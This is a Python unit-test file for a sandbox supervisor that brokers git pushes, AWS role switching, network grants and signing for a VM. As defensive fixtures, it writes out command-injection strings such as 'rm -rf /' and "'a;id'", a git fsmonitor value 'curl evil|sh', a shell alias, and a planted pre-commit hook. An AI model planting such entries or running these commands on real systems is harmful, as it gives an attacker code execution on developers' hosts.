"""Unit tests: grants, git/ssh validation, signing payload checks, list-roles parsing."""
import os, sys, tempfile, time, unittest
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
os.environ.setdefault("GONDO_PI_STATE", tempfile.mkdtemp())
os.environ.setdefault("GONDO_PI_CONFIG", tempfile.mkdtemp())
os.environ["GONDO_PI_KEYSTORE"] = "memory"
from gondopi import awsdisc, grants as G  # noqa
from gondopi.supervisor import Supervisor  # noqa


class Grants(unittest.TestCase):
    def test_window_once_deny_always(self):
        g = G.Grants("t-" + str(time.time()))
        self.assertIsNone(g.check("git-push", "github.com/a/b"))
        g.add("git-push", "github.com/a/b", G.WINDOW, 2)
        self.assertEqual(g.check("git-push", "github.com/a/b"), "allow")
        self.assertIsNone(g.check("git-push", "github.com/a/c"))
        g.add("net", "evil.com", G.DENY, 60)
        self.assertEqual(g.check("net", "evil.com"), "deny")
        g.add("net", "x.org", G.ONCE)
        self.assertIsNone(g.check("net", "x.org"))
        g.add("net", "pypi.dev", G.ALWAYS)
        self.assertEqual(G.Grants(g.path.split(os.sep)[-2]).check("net", "pypi.dev"), "allow")
        time.sleep(2.1)
        self.assertIsNone(g.check("git-push", "github.com/a/b"))


class GitBroker(unittest.TestCase):
    def setUp(self):
        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "window"}}'
        self.s = Supervisor("u-" + str(time.time()), "/tmp", "proj")

    def test_fetch_auto_push_asks(self):
        self.assertTrue(self.s.check_git("git@github.com", "22", "git-upload-pack 'newsuk/donk.git'")[0])
        self.assertTrue(self.s.check_git("git@github.com", "22", "git-receive-pack 'newsuk/donk.git'")[0])
        self.assertEqual(self.s.grants.check("git-push", "github.com/newsuk/donk"), "allow")

    def test_push_denied(self):
        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "deny"}}'
        ok, msg = self.s.check_git("git@github.com", "22", "git-receive-pack 'o/r.git'")
        self.assertFalse(ok)

    def test_rejects_non_git(self):
        for cmd in ["rm -rf /", "git-upload-pack a b", "bash -c id", "git-receive-pack '../../etc'",
                    "git-upload-pack 'a;id'"]:
            self.assertFalse(self.s.check_git("git@github.com", "22", cmd)[0], cmd)

    def test_sign_only_git_objects(self):
        ok, msg = self.s.sign(b"SSH login challenge", "ssh-ed25519 AAAA")
        self.assertFalse(ok)


class ListRoles(unittest.TestCase):
    def test_parse(self):
        out = ("Account: nuk-cdn-dev (387331467362)\narn:aws:iam::387331467362:role/nct-admin\n\n"
               "Account: nuk prod (123456789012)\narn:aws:iam::123456789012:role/nct-admin\n"
               "arn:aws:iam::123456789012:role/readonly\n")
        a = awsdisc.parse_list_roles(out)
        self.assertEqual(a["nuk-cdn-dev"]["role_arn"], "arn:aws:iam::387331467362:role/nct-admin")
        self.assertIn("nuk-prod", a)
        self.assertIn("nuk-prod-readonly", a)




class Policy(unittest.TestCase):
    """The VM policy spec: placeholders only, per-session random, each route bound to its host."""

    def test_routes_and_aws(self):
        from gondopi import paths, policy
        cfg = paths.load_config()
        cfg["aws"] = {"enabled": True, "accounts": {"a": {"role_arn": "arn:aws:iam::1:role/x"},
                                                    "b": {"role_arn": "arn:aws:iam::2:role/x", "region": "us-east-1"}}}
        spec, env = policy.build(cfg, {"aws": ["b"]})
        gh = spec["routes"]["github"]
        self.assertEqual(gh["host"], "api.github.com")
        self.assertIn("/copilot_internal", gh["excludePaths"])
        self.assertEqual(env["GH_TOKEN"], gh["placeholder"])
        self.assertTrue(env["GH_TOKEN"].startswith("gondopi_github_"))
        self.assertEqual(sorted(spec["aws"]["profiles"].values()), ["a", "b"])
        self.assertNotIn("AWS_PROFILE", env, "[default] follows the current account instead")
        guest = open(os.path.join(paths.SANDBOX_DIR, "aws-config")).read()
        self.assertTrue(guest.startswith(f"[default]\nregion = eu-west-2\naws_access_key_id = {policy.CURRENT_KEY}"))
        self.assertEqual(spec["aws"]["currentKey"], policy.CURRENT_KEY)
        self.assertNotIn(policy.CURRENT_KEY, spec["aws"]["profiles"])
        self.assertNotIn("credential_process", guest)
        self.assertEqual(policy.build(cfg, {})[1]["GH_TOKEN"], env["GH_TOKEN"], "stable within a session")
        policy._SESSION_PLACEHOLDERS.clear()
        self.assertNotEqual(policy.build(cfg, {})[1]["GH_TOKEN"], env["GH_TOKEN"], "new session, new placeholders")
        for k in env:
            self.assertFalse(k.upper().startswith("NONO_"), k)

    def test_netpolicy_js(self):
        import shutil, subprocess
        if not shutil.which("node"):
            self.skipTest("node not installed")
        here = os.path.dirname(os.path.abspath(__file__))
        r = subprocess.run(["node", os.path.join(here, "..", "vm", "netpolicy.test.mjs")],
                           capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)


class AwsUse(unittest.TestCase):
    """aws-use: from the VM it needs the panel's OK; from the host it is your own action."""

    def _sup(self, answer):
        from gondopi import grants as G2
        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "%s"}}' % answer
        s = Supervisor("u-%s" % time.time(), "/tmp", "u")
        s.cfg["aws"] = {"enabled": True, "accounts": {"a": {"role_arn": "arn:aws:iam::1:role/r"},
                                                      "b": {"role_arn": "arn:aws:iam::2:role/r"}},
                        "prod_accounts": ["2"]}
        s.aws_creds = lambda acct: {"AccessKeyId": "x"}       # no real login in tests
        s.aws_identity = lambda acct: {"account_id": "1"}
        return s

    def test_vm_needs_panel_ok(self):
        s = self._sup("deny")
        r = s.aws_use("a", via="vm")
        self.assertFalse(r["ok"])
        self.assertIsNone(s.aws_current)
        s = self._sup("window")
        self.assertTrue(s.aws_use("a", via="vm")["ok"])
        self.assertEqual(s.aws_current, "a")
        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "deny"}}'
        self.assertTrue(s.aws_use("a", via="vm")["ok"], "already current: no prompt")

    def test_host_switch_and_listing(self):
        s = self._sup("deny")                                     # a prompt would deny: must not ask
        self.assertTrue(s.aws_use("b", via="host")["ok"])
        self.assertEqual(s.aws_current, "b")
        listing = {a["name"]: a for a in s.aws_accounts()}
        self.assertTrue(listing["b"]["current"] and listing["b"]["prod"])
        self.assertFalse(s.aws_use("zzz", via="host")["ok"])
        self.assertNotIn("AccessKeyId", repr(s.aws_accounts()), "listings never carry credentials")
        os.environ.pop("GONDO_PI_PROMPT_AUTO", None)


class WorkspaceGuard(unittest.TestCase):
    """Host-exec files planted in the project from the VM are reverted / quarantined / reported."""

    def test_guard(self):
        import subprocess
        from gondopi.wsguard import WorkspaceGuard as WG
        d = tempfile.mkdtemp()
        subprocess.run(["git", "init", "-q", d], check=True)
        subprocess.run(["git", "-C", d, "config", "core.editor", "vim"], check=True)   # pre-existing: kept
        class A:
            def __init__(self): self.ev = []
            def log(self, e, **kw): self.ev.append(e)
        a = A()
        g = WG(d, a)
        cfg = os.path.join(d, ".git", "config")
        subprocess.run(["git", "config", "--file", cfg, "core.fsmonitor", "curl evil|sh"], check=True)
        subprocess.run(["git", "config", "--file", cfg, "alias.st", "!sh -c evil"], check=True)
        subprocess.run(["git", "config", "--file", cfg, "user.name", "fine"], check=True)       # harmless: kept
        hook = os.path.join(d, ".git", "hooks", "pre-commit")
        open(hook, "w").write("#!/bin/sh\necho pwned\n"); os.chmod(hook, 0o755)
        open(os.path.join(d, ".envrc"), "w").write("export X=1\n")
        g.check()
        got = subprocess.run(["git", "config", "--file", cfg, "--list"], capture_output=True, text=True).stdout
        self.assertNotIn("fsmonitor", got)
        self.assertNotIn("alias.st", got)
        self.assertIn("user.name=fine", got)
        self.assertIn("core.editor=vim", got)
        self.assertFalse(os.path.exists(hook))
        self.assertTrue(os.listdir(os.path.join(d, ".git", "gondo-pi-quarantine")))
        self.assertIn("workspace-git-config-reverted", a.ev)
        self.assertIn("workspace-git-hook-quarantined", a.ev)
        self.assertIn("workspace-trigger-file-changed", a.ev)
        n = len(a.ev); g.check(); self.assertEqual(len(a.ev), n, "steady state: no repeat events")


class ProjectSettings(unittest.TestCase):
    """The repo's .gondo-pi.json is writable from the VM: only applied once you approve it."""

    def test_repo_file_needs_approval(self):
        import json
        from gondopi import projcfg, paths
        d = tempfile.mkdtemp()
        f = os.path.join(d, ".gondo-pi.json")
        json.dump({"allow": ["api.example.com", "bad host"], "aws": "acct", "ports": [3000, 80], "vm": {"cpus": 4},
                   "services": {"x": "creds can't come from the repo"}}, open(f, "w"))
        got, note = projcfg.load("p1", d, ask=None)
        self.assertEqual(got, {}, "not applied without approval")
        self.assertIn("approve", note)
        got, _ = projcfg.load("p1", d, ask=lambda t, b: True)
        self.assertEqual(got, {"allow": ["api.example.com"], "aws": "acct", "ports": [3000], "vm": {"cpus": 4}})
        got, note = projcfg.load("p1", d, ask=None)
        self.assertEqual(got["aws"], "acct", "approved content sticks")
        json.dump({"allow": ["evil.example.com"]}, open(f, "w"))
        got, note = projcfg.load("p1", d, ask=None)
        self.assertNotIn("evil.example.com", got.get("allow", []), "a change needs approval again")
        os.makedirs(os.path.dirname(projcfg.host_file("p1")), exist_ok=True)
        json.dump({"aws": "mine"}, open(projcfg.host_file("p1"), "w"))
        got, _ = projcfg.load("p1", d, ask=lambda t, b: True)
        self.assertEqual(got["aws"], "mine", "your host file wins")


class ConfigMerge(unittest.TestCase):
    def test_user_allow_adds_to_defaults(self):
        import json
        from gondopi import paths
        d = tempfile.mkdtemp()
        old = paths.CONFIG_DIR
        paths.CONFIG_DIR = d
        try:
            json.dump({"network": {"allow": ["only.example.com"], "deny": ["pypi.org"]}}, open(os.path.join(d, "config.json"), "w"))
            allow = paths.load_config()["network"]["allow"]
            self.assertIn("only.example.com", allow)
            self.assertIn("registry.npmjs.org", allow)      # defaults kept
            self.assertNotIn("pypi.org", allow)             # removed default stays removed
        finally:
            paths.CONFIG_DIR = old


if __name__ == "__main__":
    unittest.main(verbosity=1)
